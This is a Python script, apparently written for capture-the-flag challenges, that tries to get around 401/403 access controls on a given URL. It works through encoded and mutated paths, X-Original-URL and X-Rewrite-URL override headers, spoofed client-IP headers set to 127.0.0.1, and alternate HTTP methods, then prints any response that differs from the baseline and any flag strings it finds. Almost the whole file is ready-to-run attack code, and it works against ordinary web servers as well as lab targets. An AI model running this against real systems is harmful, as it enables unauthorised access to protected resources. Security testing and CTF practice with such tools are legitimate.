#!/usr/bin/env python3
"""Try common 401/403 bypasses on one URL: path mutations, override headers,
IP-trust headers and HTTP methods. Prints anything that differs from the
baseline status.

    python bypass_403.py http://target/admin
    python bypass_403.py http://target/admin -c 'session=...'
"""
import argparse
import re
from urllib.parse import urlparse

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    u = urlparse(a.url)
    base = f"{u.scheme}://{u.netloc}"
    path = u.path.rstrip("/") or "/"
    name = path.lstrip("/")
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def req(method, p, extra=None):
        h = dict(hdr)
        h.update(extra or {})
        try:
            r = requests.request(method, base + p, headers=h, timeout=8, allow_redirects=False)
            return r.status_code, len(r.content), FLAG.findall(r.text)
        except requests.RequestException:
            return None, 0, []

    b = req("GET", path)
    print(f"baseline GET {path} -> {b[0]} {b[1]}")
    paths = [f"/{name}/", f"/{name.upper()}", f"/{name.capitalize()}", f"//{name}", f"/./{name}",
             f"/{name}/.", f"/{name}..;/", f"/%2f{name}", f"/{name}%20", f"/{name}%09", f"/{name}.json",
             f"/{name}?", f"/{name}#", f"/;/{name}", f"/{name};", f"/{name}/*", f"/.;/{name}", f"/{name}%2e",
             f"/%2e/{name}"]
    tests = [("GET", p, None) for p in paths]
    for h in ["X-Original-URL", "X-Rewrite-URL"]:
        tests.append(("GET", "/", {h: path}))
    for h in ["X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP", "X-Remote-IP",
              "X-Remote-Addr", "True-Client-IP", "CF-Connecting-IP", "X-Host", "X-Forwarded-Host"]:
        tests.append(("GET", path, {h: "127.0.0.1"}))
    tests.append(("GET", path, {"Forwarded": "for=127.0.0.1"}))
    tests.append(("GET", path, {"Referer": base + path}))
    for m in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]:
        tests.append((m, path, None))
    tests.append(("POST", path, {"X-HTTP-Method-Override": "GET"}))
    for m, p, h in tests:
        st, size, flags = req(m, p, h)
        mark = "  <==" if st != b[0] else ""
        print(f"{st} {size:7d} {m:7s} {p} {h or ''}{mark}")
        for f in flags:
            print(f"   [FLAG] {f}")


if __name__ == "__main__":
    main()
